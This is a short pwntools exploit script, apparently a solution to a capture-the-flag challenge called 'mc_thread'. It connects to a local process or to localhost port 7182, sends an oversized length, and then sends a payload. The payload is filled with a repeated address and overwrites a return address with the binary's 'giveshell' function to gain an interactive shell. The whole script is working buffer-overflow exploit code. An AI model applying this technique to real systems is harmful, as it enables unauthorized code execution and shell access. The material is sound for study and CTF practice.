#!/usr/bin/env python3

from pwn import *

exe = ELF("./mc_thread_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        #r = gdb.debug([exe.path],'''
                    #   b * 0x00000000004013ef
                    #   b * 0x000000000040136b
                    #   b * 0x000000000040139C
                    #   c
                    #   ni
                    #   thread 2
                    #   c
                    #   ''')
            
    else:
        r = remote("localhost", 7182)

    return r


def main():
    r = conn()
    r.sendlineafter("Size: ",b"2352")
    payload = p64(0x4041b0)*0x23
    payload += p64(exe.sym["giveshell"])
    payload += p64(0x4041b0)*(0x126-0x24)

    r.sendlineafter("Data: ",payload)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
